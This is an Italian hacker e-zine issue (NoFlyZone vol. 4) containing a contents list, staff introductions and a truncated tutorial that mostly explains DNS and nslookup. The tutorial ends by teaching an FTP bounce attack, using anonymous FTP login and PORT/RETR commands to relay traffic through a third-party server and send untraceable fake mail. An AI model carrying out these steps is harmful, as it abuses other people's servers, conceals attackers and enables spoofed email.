
			/==============================================\
			|*************<No Fly Zone Crew>***************|
			|****************< E-Zine >********************|
			|****************< Vol. 4 >********************|
			\==============================================/



                  /X\
                //   \\
              //       \*
            //        //|
          //         /  |
        //          |   /
      //            | //    /X\
    //              |/    //   \\
  //         /|     |   //       \*
 X         // |     | //        //|
 |\\     //   |     |/        //  |
 |  \\ //    /|             //    /
 |    *    // |           //    //    /X\
  \\  |  //   |         //    //    //   \\
    \\|//   //         /    //    //       \
      X    *         //   //    //          X\
           |\\     //    /    //             \\
           |  \\ //    //   //         /       \
           |    *    //   //         //|\\      \\
            \\  |  //   //          X\ |  \\     /*
              \\|//   //              \|    \\ // |
                \    *         /|\     /*\    *   |
                     |\\     // | \\ // | \\  |  //    /X
                     |  \\ //   |   *   |   \\|//    //  \\
                     \    *    / \  |  /|           *      \\
                      \\  |  //   \\|//             |\\      \\
                        \\|//       X               |  \\      \\
                                                    \\   \\      \\
                                                      \\   \\      \\
                                         /--------------------       *
                                       //                          //|
                                      |\                         //  |
                                      | \\     ------------------| //
                                      \\  \\      \\             |/
                                        \\  \\      \------------*
                                          \\  \\      \\
                                            \\  \\     /*
                                              \\  \\ // |
                                                \\  *   |/
                                                  \\| //
                                                    +/




=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-------------------------------[E-Zine No 4]-----------------------------------
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-------------------------------------------------------------------------------
------------------------------[Menu Articoli]----------------------------------
-------------------------------------------------------------------------------
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
----------[INTRO]--------------------------------------------------------------
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

1.......Intro...................................by NoFlyZone Staff

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
----------[Hacking]------------------------------------------------------------
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


2.......DNS Attack..............................by Cyberdude
3.......DoS e DDoS..............................by Evilcry
4.......SYN Flood...............................by lordvicio
5.......Sock or Die.............................by [V]lad
6.......Occhio all'Autenticazione di Windows NT.by [G]oGeT[A] & CyBe[R]pUnK
7.......IIS Hack #1.............................by R|Ppy

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
----------[THEORY]-------------------------------------------------------------
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

8.......fork()..................................by Evilcry
9.......SSL.....................................by [Evil]
10......Processi di elaborazione................by Evilcry
11......Kernel linux: intro.....................by reef
12......ARP.....................................by lordvicio
13......Intro al binario e circuiti logici......by [Evil]

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
----------[PROGRAMMING]--------------------------------------------------------
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

14......LibNet & LibPCAP:make it easy...........by CityHunter
15......Java(*).................................by anonimo
16......LibPCAP.................................by Valk

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
----------[Misc]---------------------------------------------------------------
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

17......Reverse C6..............................by BIGAlex
18......VB Client-server application............by endsub & [Evil]
19......T/TCP...................................by Cyberdude
20......Linux Box sicura........................by goony
21......Intranet................................by Cyberdude
22......Appunti di sicurezza Linux..............by goony
23......Intro alle API di Linux.................by kernel2418

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
----------[News]---------------------------------------------------------------
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

24......UMTS....................................by Cyberdude
25......DIVX....................................by Cyberdude

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
----------[Source]-------------------------------------------------------------
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

26......Sockfind.c..............................by [V]lad
27......Backdoor.c..............................by [V]lad
28......Sniffcap.c..............................by CityHunter

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
----------[Allegati]-----------------------------------------------------------
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

29......Antifurto...............................by Tron72
30......Traslatore di livelli...................by Tron72
31......Firewall................................by endsub

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
32......Greetings...............................by NoFlyZone Staff
-------------------------------------------------------------------------------

Mode E-Zine on:

Prima di tutto xò:

===============================================================================
DISCLAIMER:
Tutto il materiale pubblicato in questa zine è di pubblico dominio.
A scopo educativo e di ricerca. Gli autori non si assumono alcuna responsabilità
per l'uso di ciò che viene spiegato e di eventuali danni.
Consigli x l'uso: accendere il cervello.
===============================================================================



-----------------------------------<INTRO>-------------------------------------
------------------------------<NoZlyZone Staff>--------------------------------

Benvenuti,qua è il solito lordvicio che vi parla :) . Sono davvero contento per
tutto il successo riscontrato,le numerose e-mail,i numerosi visitatori,insomma
abbiamo ricevuto davvero tanti complimenti ed incoraggiamenti a continuare così.
Spero di non deludervi,stiamo mettendo anche l'anima in questo progetto.....
L'impegno e la costanza ci hanno portato alla nuova uscita della ormai assodata
"NoFlyZone E-zine" gh gh..Adesso,come da abitudine passo la palla all'ormai più
che famoso :) CityHunter da sempre mio grande collaboratore e amico ; da questo 
numero,due nuove new-entry,che collaboreranno alla nostra rivista dando un
notevole contributo. I nuovi entrati sono: endsub e click.Sono sicuro che aiute-
ranno la rivista a crescere ulteriormente,a loro auguro di trovarsi bene nel
nostro gruppo e di fare un buon lavoro...Buona lettura 
                                                              

                                                           []LoRd[V]icio[] 
                                                             NoFlyZone staff


E woilatte(leggasi ualà)!!Eccoci di nuovo qua, con un numero fresco fresco an-
che in questa torrida estate, brulicante di zanzare e umidità. Che dire?
Questo è un numero un po' "nel mezzo" (no,non gay) nel senso che a poco a poco
ci stiamo discostando dal livello "oggi buco un server" per arrivare un po' più
in su...ecco, non ci siamo ancora arrivati secondo me, ma credo che la strada
sia quella giusta! Voi continuate a darci una mano, mi raccomando!:)
(Quest'anno non c'ero all'Hackmeeting, ma al prox se avete scritto x noi vi
offro una birra:))

Tocchiamo un attimo un discorso dolente, almeno per quello che mi riguarda(CH).
All'hackmeeting lo staff di OQ è stato accusato da alcuni membri del Sofpj
di aver messo sul loro numero 4 un mio articolo rippato da BFI4 (progetto
OnoSendai,FuSyS).
Inizio col dire che OQ non c'entra nulla e che non può controllare l'effettiva
originalità di tutti gli articoli, quindi mi assumo IO SOLO la responsabilità
dell'accaduto. Ma lasciatemi dire qualcosa a mia discolpa:)
Inizio col dire che non ho mai negato di aver preso molto dai testi di FuSyS,
che considero un grande e che ha fatto lavori straordinari, e che non era certo
mia intenzione prendere meriti non miei. Il mio lavoro lo si può considerare un
tributo all'opera di FuSyS, così come probabilmente i suoi lo sono stati per
quelli di coder@reptile. All'epoca in cui lo scrissi stavo studiando le basi di
tutto il TCP e dello spoofing, quindi FuSyS è stato un po' come la manna per me.
Se quello che ho scritto è simile al suo(senza se,sono il primo a dirlo) è solo
perché mentre studiavo scrivevo e imparavo(stessa cosa per il codice, potevo
mettere spoofit.h e tutto sarebbe finito lì probabilmente).
Ripeto: non era nelle mie intenzioni rippare da FuSyS e prendere meriti non miei.
Chiedo cmq scusa a OQ, Softpj e a FuSyS per la spiacevole questione. Spero che
con questo sia chiuso il capitolo.(Vabbè,ho capito, al prox hackmeeting offro
una birra anche a voi...)

K, chiusa la questione...siori e siore...NFZ numero 4:)

										CityHunter
							          	    NoFlyZone staff

Anche il numero 4 della nostra E-zine è stato finalmente partorito.
E' sera,vicio mi ha appena detto di scrivere un'intro per l'imminente
uscita dei nfz n.4 , un numero che  rappresenta il lavoro dei membri
interni ma anche della collaborazione di amici che hanno voluto
aiutarci. NoFlyZone sta crescendo e spero che questo numero ne sia
una prova inconfutabile,non abbiamo pretese di essere ai livelli di
S0ftpj ma ogni giorno cerchiamo di migliorarci sempre di più e di
offrirvi qualcosa di sempre + tecnico e...perché no divertente ;).
Questo è il primo numero al quale partecipo in quanto membro della Nfz
e devo dire che molto è stato fatto per rendere questa nostra
produzione migliore rispetto alle altre, si è ricercato un maggiore
skill tecnico con esempi di listati sempre mirati all'hacking e alla
sicurezza informatica. Siamo già al num 4 e il sudore speso da noi
tutti a scrivere queste pagine ha dato i suoi frutti,ha fatto bene al
nostro gruppo per renderci più affiatati e per migliorare insieme il
nostro livello di skill, un livello che vuole essere in continuo
sviluppo poiché nulla ci gratifica di più che guardare il percorso
fatto tra errori e soddisfazioni e valutare quanto ci si è migliorati.
Questo numero vede la luce in un periodo ricco di avvenimenti, dalla
discussa uscita i HJ alla decisione di R.chiesa di non venire all'HM,
tutti fatti che , nel bene e nel male devono essere di stimolo per
continuare a migliorarsi sempre più, mantenendo acceso il confronto tra
le varie comunità (informatiche e non).Certe volte viene da
chiedersi il perché di un'ennesima E-zine quale NfZ,ma è attraverso
questi testi, queste produzioni, che noi vogliamo farci sentire,soltanto
mostrando agli altri il nostro lavoro si può sperare di essere utili
al sottobosco italiano, cercando di migliorare. Siamo piccoli ma stiamo 
crescendo e sempre più faremo sentire la nostra voce con 
progetti e...ovviamente con NoFlyZone.

Beccatevi sto numero ;)

P.S.: Purtroppo non ci saranno miei articoli in questo numero
nonostante avessi preparato un modulo davvero carino, ma la sfortuna
ha voluto che lo finissi solo pochi giorni fa e non ho avuto tempo di
testarlo (dato che avevo bisogno di due macchine connesse e il povero
City era sotto esami), cmq per il prossimo numero avrete la versione
1.0 pronta

Alla proxima con il mio LKM !!

                                                                  click
                                                               NoFlyZone staff 



-----------------------------------<END>---------------------------------------


=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-------------------------------------------------------------------------------
----------------------------------[HACKING]------------------------------------
-------------------------------------------------------------------------------
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


-------------------------------------<2>---------------------------------------
---------------------------------<Cyberdude>-----------------------------------
---------------------------------<DNS Attack>----------------------------------


INTRO

Bene bene a quanto pare, siamo di nuovo insieme per una nuovissima avventura,
certo  devo dire la verità che LordVicio è sempre molto gentile con me,
mi da sempre le cose più impegnative hihihihi ma che ci vogliamo fare? Che
dire, in fondo mi fa piacere che abbia almeno questa fiducia in me per farmi
scrivere tutorial del genere giusto? Quindi devo anche ringraziarlo hhihihih
Tnk VICIO :) ... ok adesso direi di proseguire e di non perdere altro tempo
prezioso, tuffiamoci nel DNS

DI COSA PARLEREMO

Ragazzi in pratica vi faccio prima una bella presentazione di 7 pagine su
tutto quello che rappresenta il DNS (perché è questo il nostro studio) e
poi dopo vi farò capire anche in pratica come possiamo usarlo per attaccare
un sito usando una semplicissima FakeMail ok?
Beh non è molto difficile, basta che mi seguiate!!

START

Dunque direi che i prossimi 5 righi possono essere definiti come una vera e
propria introduzione supplementare per coloro che non conoscono neanche cosa
sia DNS ok?
Il Domain Name System, o DNS in breve, è una delle tante applicazioni di rete
che non sarebbero indispensabili in senso stretto, ma che quando non sono
configurate correttamente sono la disperazione di tutti. Fortunatamente, la
gestione sotto Unix di un dominio non è complicata, e richiede soltanto un
poco di attenzione...

RACCONTINO PER SPIEGARCI MEGLIO
( consigliato ai più duri di comprendonio)

Stasera abbiamo lanciato il nostro Netscape per farci la solita navigata,
quando a un tratto l'applicazione sembra smettere di funzionare. Guardiamo
le lucine del modem, e non sembra che la connessione sia stata persa.
Congestione della rete? Il nostro provider ha fatto bancarotta? Passa
qualche interminabile secondo, e alla fine compare la fatidica finestrella
di errore: "Il server non è rintracciabile dal DNS". Ma come? - diciamo - è
lo stesso indirizzo che sto usando da mesi. L'abbiamo persino richiamato da
un nostro bookmark: come fa ad essere sbagliato? Telefoniamo al nostro
provider, che come spesso accade ci risponde "non è colpa nostra, ma del
sito che state chiamando". Ma oggi siamo proprio fortunati, e ci dà una
serie di numeri che non sono da giocare al lotto (troppo grandi), ma che
sono da sostituire al nome del server remoto. Avviene il miracolo: ecco la
connessione azzeccata!! hihihih :)

RIPRENDIAMO IL TUTORIAL

vi siete mai chiesti come faccia il vostro server a risolvere un nome in un
indirizzo? Beh qui interviene il caro DNS ... Il DNS nacque più di dieci
anni fa, quando la Rete era molto più piccola, e non si era neppure certi
che Internet sarebbe stata la soluzione a tutti i problemi!!
Dunque è opportuno spiegare come vengono fatte in pratica le richieste di
risoluzione di indirizzi. La maggior parte dei sistemi non si preoccupa più
di tanto: il calcolatore si limita a conoscere l'indirizzo di un altro
calcolatore che sia in grado di gestire le risoluzioni: in pratica, un
nameserver. Esso interrogherà pertanto il suo risolutore di fiducia, e
aspetterà tranquillo una risposta da esso. Gli indirizzi dei risolutori sono
contenuti sotto Unix in un file denominato /etc/resolv.conf,mentre sotto
Windows occorre specificarli nella configurazione del TCP/IP (guarda un pò
se i miei tutorial non riguardano sempre sto protocollo del .... hihihihi )
Discutiamo la configurazione di Unix, da cui tutte le altre sono derivate;
comunque gran parte del discorso si applica pure a Windows e agli altri
sistemi operativi. Il file ha una struttura davvero semplice: le uniche
parole chiave riconosciute sono domain e nameserver: la prima specifica il
dominio di default da aggiungere se si fa una richiesta senza alcun nome di
dominio; la seconda invece contiene l'indirizzo in formato numerico di un
risolutore. Mentre si può indicare uno e un solo dominio, si possono
indicare più nameserver, sempre per sperare di trovarne sempre almeno uno
raggiungibile. Per mezzo di questo file, il nostro calcolatore sa perciò chi
interrogare; il come è una connessione sulla porta 53, dedicata al DNS. ok?
Non è invece richiesto un tipo specifico di protocollo di trasporto: il
sistema può pertanto scegliere tra TCP e UDP. Le macchine Unix che fanno da
nameserver hanno un demone, named, il cui scopo è quello di gestire le
richieste. In fase di bootstrap, il calcolatore fa partire questo demone che
comincia subito a leggersi un file di configurazione che solitamente si
chiama /etc/named.boot

IL FILE /etc/named.boot

; file di boot per named
;
directory		/var/named
;
domain	cselt.stet.it
; tipo		dominio			host/file	file di backup
cache		.			named.ca
primary		cselt.stet.it		cselt.db
primary		162.163.in-addr.arpa	cselt.rev
primary		1.0.0.127.in-addr.arpa	localhost.rev
secondary	infomedia.it		194.243.78.5	infom.db
forwarders	10.0.0.100		10.0.0.200
; slave
sortlist	10.0.0.0		163.162.0.0

SPIEGHIAMO L'ESEMPIO

Nell'esempio appena illustrato, notiamo varie parole chiave... La prima è
directory, che specifica dove si conservano tutti gli altri file. I domini
per cui il nameserver è autorevole sono indicati dalle righe primary e
secondary. Per i domini in cui si è primari oltre che autorevoli, occorre
indicare il nome del dominio stesso (senza il punto finale), e il nome del
file in cui conserviamo i dati, e che si trova nella directory di cui sopra.
Per i domini dove invece si è un nameserver secondario, dopo il nome del
dominio c'è un campo in cui si indica l'indirizzo IP del primario per quel
dominio: in questo modo si sa a chi rivolgersi per ottenere le informazioni
su quella zona. Segue infine il nome di un file, dove le informazioni
verranno salvate. Nel caso non si riesca a contattare il nameserver primario
quando il demone named viene lanciato, si possono così utilizzare queste
copie di backup.

RIPRENDIAMO IL TUTORIAL

Dunque ragazzi... parliamo adesso di reverse lookup ( risoluzione inversa)!!
 A che cosa serve? A scoprire quale nome corrisponda ad un indirizzo IP dato
l'esatto opposto, cioè, della tipica risoluzione. In teoria basterebbe
spulciare tutta la base dati per scoprire quale nome corrisponda
all'indirizzo IP 163.162.20.125. Ma la cosa è chiaramente impossibile: si è
preferito piuttosto inventare un dominio fittizio in-addr.arpa che ha come
suoi sottodomini gli indirizzi IP stessi. Visto che in un dominio la parte
più generica deve stare sulla destra, succede che i quattro byte
dell'indirizzo IP vengono scritti alla rovescia, e si ha il nome
125.20.162.163.in-addr.arpa; si scrive infine che esso non è altro che un
alias del nome cercato, e il gioco è fatto... capito?
Esiste poi una riga cache, che punta ad un file che contiene le informazioni
relative ai risolutori di più alto livello, con cui la cache del demone
viene inizializzata. Da qualche punto bisogna pur partire, infatti, per
ottenere le risoluzioni, dati che non saranno naturalmente autorevoli come
quelli forniti da primari e secondari. Allora ragazzi adesso parliamo un pò
di geografia, il nameserver primario è presso InterNic, che gestisce il DNS
per conto dello IANA, l'organismo che tra le altre cose sovraintende
all'assegnazione dei domini di primo livello. Tra i secondari, sette di loro
si trovano negli USA, e uno in Norvegia, alla faccia della distribuzione
delle risorse. Naturalmente, nulla vieta di avere più cache, magari una per
it. Si deve però essere certi che gli indirizzi IP corrispondenti non
cambino, se non si vogliono avere delle brutte sorprese. Supponiamo di
essere convinti che il modo di assegnare i nomi sotto it è completamente
stupido, e di inventare un dominio di primo livello .ita. Impossibile,
direte voi. La nostra macchina conoscerà sì il dominio .ita, ma i root
server no, e quindi nessun altro potrebbe trovare quel dominio. Ma cosa
succede se convinciamo la gente a puntare la propria cache sul nostro server,
invece che su quelli ufficiali? Poiché nella nostra cache c'è il vero dominio
di livello zero, siamo in grado di risolvere per chiunque tutti gli indirizzi
ufficiali; come bonus, diamo poi il dominio .ita. Fantasia? No. Il più famoso
di questi root server "fantasma" è AlterNet (alternic.net nel mondo reale,
.nic nei dati da esso gestiti), che ha già creato parecchi TLD, come .sex e
.xxx. Pensate a cosa succederebbe se Bill Gates decidesse che .msn dovrà
diventare il dominio di livello uno per la sua rete. Pensate forse che lo
IANA riuscirebbe a impedirlo? Beh io penso proprio di no! ihihihi :)

PICCOLO RIASSUNTINO GENERALE

Il Domain Name System, come abbiamo visto, è la struttura che permette di
associare dei nomi logici agli indirizzi fisici IP di un calcolatore; le
associazioni vengono fatte in seguito a richieste di risoluzione. Anche se
viene visto dall'utente come una struttura monolitica, il DNS è in realtà
spezzettato in numerose parti, dette zone.
Ciascuna zona, poi, è data in affidamento a un calcolatore che si chiama
nameserver primario, e che contiene al suo interno tutti i dati relativi ai
nomi definiti nella zona stessa: una copia di questi dati è inoltre presente
su altri calcolatori, detti nameserver secondari, per distribuire il
traffico sulla rete.
La maggior parte dei calcolatori si limita invece ad essere un risolutore:
quando ha bisogno di ottenere dei dati, spedisce la richiesta a un
nameserver e aspetta comodamente la risposta

CONTINUIAMO (SE AVETE CAPITO TUTTI)

I dati relativi al DNS sono mantenuti in strutture speciali, dette record
di risorsa (o RR in breve, dall'inglese Resource Record), e le richieste
fatte ai resolver o ai name server avvengono tutte per mezzo di RR. Un
record completo ha cinque campi: nome, classe, TTL, tipo e dati...
Dunque il nome corrisponde a un calcolatore o a un dominio, per quanto
riguarda la classe, bisogna tenere presente che oggi viene ormai usata
solamente IN (che sta per "Internet"), anche se nei sacri testi degli RFC
ne sono indicate alcune altre. Il tipo del record serve invece a dirci che
cosa questo record rappresenta, oppure, nel caso si stia facendo una
richiesta al DNS, di quali record vogliamo avere informazioni!! Il campo
Time To Live, o TTL in breve, merita qualche parola in più. Esso è un
numero, il cui scopo è di dire a chi sta facendo una richiesta per quanto
tempo - misurato in secondi - si può utilizzare la risposta che gli viene
data. Non si può infatti pretendere che il risultato ricevuto sia corretto
vita natural durante. Tutto scorre, un calcolatore può essere eliminato o
fisicamente spostato, può nascere una nuova zona...

PASSIAMO AL CUORE DEL TUTORIAL

Dunque ragazzi, da bravi hacker prima di attaccare il vostro obbiettivo, in
questo caso DNS dovete conoscere abbastanza bene la vostra vittima ... fino
ad ora, vi ho illustrato brevemente un pò di quanto riguarda DNS, così anche
chi non conosce neanche che cosa sia, adesso ne ha almeno un piccola
infarinatura, quindi noi come un abile cacciatore che prima di attaccare la
preda, la studia in tutti i suoi particolari, adesso sappiamo quanto ci può
interessare di DNS per poter attaccare la nostra preda!! ok?
Storicamente si interroga manualmente il DNS usando il comando nslookup.
Questo comando ha purtroppo avuto delle peripezie nel corso della sua vita:
nei sistemi BSD lo si trovava sotto /etc e con una sintassi più limitata di
quella attuale: da linea di comando si poteva solo risolvere un record A,
altrimenti occorreva entrare in modalità interattiva. Le nuove versioni del
programma, come ad esempio quella che si trova su Solaris, sono migrate
sotto /usr/sbin e sono più adatte per la risoluzione interattiva anche di
record diversi. La sintassi completa del comando è

nslookup [ -opzione ]
[ host-to-find | - ] [ server ]

Il carattere - si usa, sia nella versione vecchia che nella nuova, quando si
vuole entrare in modalità interattiva e non si vuole usare il server di
default (ovvero il primo indicato in /etc/resolv.conf oppure - in sua
mancanza - la macchina stessa).
L'opzione che si può indicare è una qualunque di quelle che in modalità
interattiva si specificano con set opzione=valore: all'atto pratico, quella
che viene usata quasi sempre è -q=tipo per specificare quale tipo di record
si vuole. Se va bene un qualunque record, si usa "any" e non "*". Un avviso:
mentre per la richiesta di un record A, o anche per il SOA, non occorre
terminare il nome dell'host con un punto, se si vuole sapere il record MX
corrispondente a un nome il punto diventa fondamentale. Se si è passati in
modalità interattiva, è bene sapere che vi si esce con CTRL-D.
Qui si possono dare vari comandi aggiuntivi. Si può cambiare "in corsa" il
server che si sta utilizzando per chiedere informazioni: server dominio e
lserver dominio servono entrambi a tale scopo, con la differenza che il
secondo scopre come trovare il dominio partendo dal server iniziale e non da
quello che si sta usando. Se quindi scopriamo che ci siamo avventurati in
un vicolo cieco, occorre usare la seconda forma. Se ci si vuole divertire
con i root server "alternativi" i comandi da eseguire sono due: prima set
root=nome per indicare il nuovo root server che si vuole usare, poi root per
dire che le richieste devono essere fatte al root domain. Si possono avere
tutte le informazioni su un dominio in una volta sola con il comando
ls [ -opzione ] dominio; è possibile ridirigere l'output su un file con i
soliti caratteri di ridirezione, ed è persino possibile vedere il file
mentre si sta lavorando, con il comando view file. L'opzione più importante
che si può usare è -t , che permette di specificare un tipo.
Ad esempio, ls -t cname cselt.stet.it ritorna questo risultato:

switch sgsun1.cselt.stet.it
serversia ver_sia.cselt.stet.it
dnsnole anduril.cselt.stet.it
postmaster postal.cselt.stet.it
[...]

da cui si vedono alcuni tra gli alias all'interno del dominio cselt.stet.it.
Limitandoci alle richieste singole, si definisce il tipo di ricerca che si
vuole fare con il comando set q=tipo; tutte le opzioni settabili con i loro
valori al momento si possono conoscere scrivendo set all. Possono essere
interessanti set norecurse, che disabilita la possibilità di richieste
ricorsive, e set retry=quantità, che può essere utile per collegamenti
lenti: invece dei quattro tentativi di default, se ne fanno quanti indicati.
Nell'infinita bontà dei creatori del programma è stato poi aggiunto il
comando help che dà un rapido elenco dei comandi disponibili.
Una delle aggiunte simpatiche al sistema operativo Solaris è stata il
comando nstest. Esso è solamente interattivo, però dà molte informazioni in
più; in pratica, tutti i pacchetti DNS vengono presentati completamente
all'utente. I comandi possibili sono tutti della forma xnome, dove x è un
tipo di richiesta (? dà un rapido elenco) e nome il nome che si richiede. In
questi casi un esempio vale più di mille parole: se si prova a chiedere qual
è il record A corrispondente a www.cilea.it, si scrive

>awww.cilea.it

VEDIAMO COSA OTTENIAMO

Parte della risposta a un&#8217;interrogazione di nstest
HEADER:
        opcode = QUERY, id = 4, rcode = NOERROR
        header flags:  rd
        qdcount = 1, ancount = 0, nscount = 0, arcount = 0

QUESTIONS:
        www.cilea.it, type = A, class = IN

Querying server (# 1) address = 127.0.0.1
got answer:
HEADER:
        opcode = QUERY, id = 4, rcode = NOERROR
        header flags:  qr rd ra
        qdcount = 1, ancount = 2, nscount = 3, arcount = 6

QUESTIONS:
        www.cilea.it, type = A, class = IN

ANSWERS:
        www.cilea.it
        type = CNAME, class = IN,
                  ttl = 17 hours 30 mins 19 secs, dlen = 17
        domain name = icl382.cilea.it
[...]


PROSEGUIAMO

Ragazzi... con le informazioni che vi ho dato potete raggiungere qualsiasi
risultato abbia la vostra "folle mente" hihihihih :) naturalmente ne dovete
conoscere almeno un pò di reti... se vi può interessare adesso vi parlerò di
alcuni attuali sviluppi riguardo il DNS !!
L'IETF mantiene ben due Working Group relativi al DNS: essi sono "DNS IXFR,
Notification, and Dynamic Update (dnsind)" e "Domain Name System Security
(dnssec)". Il primo di essi ha come scopo quello di semplificare la gestione
del DNS, permettendo agli implementatori di avere uno standard di riferimento
perfettamente definito. Gli argomenti di cui il gruppo si sta occupando sono
tre:

il trasferimento incrementale di una zona: trasferire tutto il nostro pippo.it
non è certo un problema, ma quando si hanno decine di migliaia di record come
nella zona .com, può cominciare ad essere interessante immaginare di evitare
di chiedere al primario tutta la zona, ma limitarsi a quanto è stato aggiunto,
tolto e modificato dall'ultima versione posseduta.

l'avviso di modifica di una zona: a differenza di quanto accade oggi, è il
nameserver primario che avvisa esso stesso i secondari (che possono, a loro
volta, aggiornarsi più velocemente).

l'aggiornamento dinamico: sempre quando si hanno delle zone molto grandi, e
che vengono aggiornate molto spesso, il nameserver primario può direttamente
inviare l'aggiornamento ai secondari che conosce. In questo modo, un nuovo
sottodominio può essere subito reso noto.

OPS... DEVO CONTINUARE

Cazzo... vorrei dire, io pensavo di aver finito e invece niente!! oggi sono
leggermente, un pochino nervoso ragazzi!! Cioè secondo me questo tutorial
potrebbe andare bene! e invece no! LordVicio vuole qualcosa di più, volete
sapere cosa vuole in più? Guardate ke non è 1 cazzatella, mi ha chiesto
chiaramente di scrivere come hackerare il DNS... cazzo hai detto niente!!
Vabbè ragazzi scorciamoci le maniche e diamoci da fare visto che loro questo
vogliono, noi questo ci studiamo!! ok?
Naturalmente per fare ciò non dovete essere i primi fessi di questo pianeta,
necessita di una basilare conoscenza di hack.. ok? spero possiate continuare
a leggere tutti

DISCLAIMER

In qualità di scrittore di questo testo, declino ogni mia responsabilità
dall'uso illecito delle informazioni date!!
ok? ragazzi beh a questo punto se leggete avete di conseguenza accettato
mi dispiace ma io devo anche tutelarmi hihihih :) vabbè andiamo al sodo

HACKERARE CON DNS

Ebbene sì ragazzi, da quanto è possibile capire dal titolo di questo prossimo
paragrafo DNS c'è molto utile per "hackerare" hihihihi beh naturalmente
abbiamo bisogno anche di altro, cosa? semplice... di FTP
Passiamo ora a qualcosa di veramente interessante: FTP. Vi chiederete: ma
FTP non serve solo a trasferire i file? La risposta è no. Beh, dovrebbe
essere si... ma sapete com'è... un hacker è un pò come un bambino curioso
che si diverte di più a "smontare" un giocattolo che a usarlo per quello a
cui servirebbe... Penso che voi sappiate che FTP altro non è che una
sessione di Telnet con qualche piccolo extra in piè (il trasferimento di
file). Allora detto questo, la tecnica che ci accingiamo a studiare è detta
"FTP Bounce" (rimbalzo dell'FTP).Siamo pronti? Allora quello che ci serve è
un server FTP che ci permetta di inviare e prelevare file da una directory
non vi preoccupate perché non è difficile trovarli, oltretutto gratis!!
Una volta trovato il server non potrei fare nomi ma gli stessi Supereva e
Intrefree vanno bene ok? Questo server sarà la vostra "base". In tutti gli
attacchi che effettuerete verrà visualizzato l'IP Address di questo server,
anziché il vostro e direi che il fatto può essere abbastanza comodo... ke
ne dite? Allora, adesso è il momento di preparare l'attacco... dovremo
innanzi tutto creare un file che contenga i comandi che vogliamo far eseguire!
Una volta inviato il nostro file, chiuderemo FTP e passeremo a Telnet. La
porta di FTP è la numero 21. Colleghiamoci dunque al server "base" alla
porta 21 e aspettiamo una risposta. Ora potremo inserire i comandi:

USER anonymous
PASS nessuno@niente.com

e, se l'accesso anonimo è abilitato (come succede nel 90% dei casi), il
server risponderà qualcosa come "User anonymous logged in". Siamo dentro!!
Dobbiamo ora conoscere l'IP Address del server da attaccare e in questo
momento entra in gioco anche il nostro caro DNS per risalire dall'host name
all'IP Address... ci siamo? Ora digitiamo (in Telnet) il comando PORT
x,x,x,x,0,y dove x,x,x,x è l'IP Address del server da attaccare e y è la
porta del servizio da attaccare (21 per FTP, 80 per il Web, e così via)...
Bene! Quello che succede inserendo il comando PORT è questo: diciamo al
server FTP di collegarsi all'IP Address e alla porta che gli diamo come
parametri. In pratica, sarà il server FTP a collegarsi, anziché noi...
abbiamo così il server come "complice", in quanto sarà lui a fare tutte le
operazioni e le eventuali tracce lasciate saranno le sue! :) Noi siamo
nell'ombra...capito? Basterà ora digitare RETR nomedelfileinviato e tutti i
comandi desiderati saranno inviati dalla "base" alla "vittima".

ESEMPIO DIMOSTRATIVO

Vogliamo ad esempio inviare una FakeMail impossibile da rintracciare?
Allora studiamo il problema in questi termini:

1) quali tipi di comandi dovremo inserire nel file?
2) quale servizio stiamo hackerando?
3) quale server useremo come destinazione?

Ecco le risposte:

1) i comandi saranno per SMTP, dovendo noi inviare una FakeMail
